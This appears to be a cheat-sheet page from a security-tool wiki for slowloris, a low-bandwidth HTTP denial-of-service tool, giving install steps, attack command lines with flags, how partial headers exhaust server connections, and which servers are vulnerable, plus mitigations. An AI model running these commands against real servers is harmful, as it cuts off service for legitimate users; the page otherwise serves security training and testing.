# slowloris — low-bandwidth HTTP DoS

> **Holds HTTP connections open by trickling partial headers.** Exhausts the server's connection pool with very little bandwidth.

**Install:** `pip install slowloris` or `git clone https://github.com/gkbrk/slowloris`

---

## 🎯 Cheat-flow

```bash
slowloris target.com                       # default: port 80, 150 sockets
slowloris target.com -p 443 --https        # TLS
slowloris target.com -s 500                # 500 concurrent sockets
slowloris target.com --sleeptime 10        # seconds between keep-alive sends
slowloris target.com --ua                  # randomise User-Agent
slowloris target.com -v                    # verbose
```

---

## 🔑 Flags

| Flag | Meaning |
|---|---|
| `-p <port>` | Port (default 80) |
| `-s <N>` | Max sockets to open |
| `--https` | Use TLS |
| `--sleeptime <sec>` | Delay between partial sends |
| `--ua` | Random User-Agent per socket |
| `-v` | Verbose |

---

## 🧠 How it works

1. Open many TCP connections to the target.
2. Send a partial HTTP request:
   ```
   GET / HTTP/1.1\r\n
   Host: target\r\n
   User-Agent: ...\r\n
   ```
3. Never finish with the blank line.
4. Every ~15 seconds send one more harmless header → server keeps the socket.
5. Target's worker threads fill up → legitimate clients get refused.

---

## ⚠️ Gotchas

- **Works against Apache prefork, dhttpd, Squid**. Not effective against nginx / IIS / CloudFlare (connection reverse proxies drop partial requests).
- Mitigations: `mod_reqtimeout`, `mod_qos`, connection-per-IP limits, CDN.
- **Legal only on lab targets.**
- Classic tool — still a CEH favorite because of how cheap it is.

---

## 🔗 Related

- [hulk](hulk.md) · [loic](loic.md) · [hping3](hping3.md)
